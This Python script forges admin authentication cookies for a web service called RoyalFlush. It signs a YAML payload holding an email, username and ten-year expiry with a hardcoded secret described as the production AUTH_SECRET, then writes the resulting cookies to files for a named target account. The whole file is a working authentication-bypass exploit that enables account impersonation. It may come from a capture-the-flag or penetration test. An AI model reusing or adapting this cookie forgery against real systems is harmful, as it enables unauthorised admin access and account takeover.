#!/usr/bin/env python3  
"""  
Forge RoyalFlush auth cookies for the two candidate admin emails.  
Requires production AUTH_SECRET.  
"""  
  
import yaml  
import hmac  
import hashlib  
import base64  
import time  
  
AUTH_SECRET = "862bfcb745b9a45f6d5a7c91492ce08a"  
  
  
def forge_cookie(email, username, expires_at):  
    y = yaml.dump({  
        'email': email,  
        'username': username,  
        'expires_at': expires_at  
    }).encode('utf-8')  
  
    h = hmac.new(  
        AUTH_SECRET.encode('utf-8'),  
        y,  
        hashlib.sha256  
    ).digest()  
  
    return base64.b64encode(h + y).decode()  
  
  
def main():  
    expires_at = int(time.time()) + 60 * 60 * 24 * 365 * 10  
  
    targets = [  
          
        ("lbrown@hotmail.com", "chandlerjoseph"),  
    ]  
  
    print("=== RoyalFlush Forged Admin Cookies ===\n")  
  
    for email, username in targets:  
        cookie = forge_cookie(email, username, expires_at)  
        safe = email.replace("@", "_").replace(".", "_")  
        filename = f"cookie_{safe}.txt"  
  
        with open(filename, "w") as f:  
            f.write(f"auth={cookie}\n")  
  
        print(f"Email:    {email}")  
        print(f"Username: {username}")  
        print(f"Cookie:   auth={cookie}")  
        print(f"Saved to: {filename}\n")  
  
  
if __name__ == "__main__":  
    main()